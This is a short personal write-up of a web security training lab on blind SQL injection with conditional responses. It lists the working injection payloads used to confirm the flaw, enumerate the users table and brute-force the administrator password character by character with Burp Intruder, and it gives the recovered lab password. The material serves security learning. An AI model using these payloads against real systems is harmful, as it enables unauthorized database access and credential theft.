# Lab: Blind SQL injection with conditional responses

(Appending queries to the TrackingId cookie)

Check that the vulnerability exists
- "Welcome back" appears: `' AND '1'='1`
- "Welcome back" doesn't appear: `' AND '1'='2`

Check that a "users" table exists: `' AND (SELECT 'a' FROM users LIMIT 1)='a`

Check that "administrator" user exists: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

Check the length of the password: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`

Send the payload to Intruder and set it to use a payload with alphanumeric characters, selecting the substring character as the variable (§a§): `'AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`

Also set the grep-match options to check for "Welcome back" in the page response.

Go through and increment the substring index, noting the character resulting in the success message for each index.

Login with the resulting string: 0158a5dvuzk1gk6ywthi

---

I was able to find the relevant query for enumerating the password string, but I looked at the solution because I didn't have the patience to iterate through it manually. I knew there was a better way, but I didn't know anything about Intruder yet.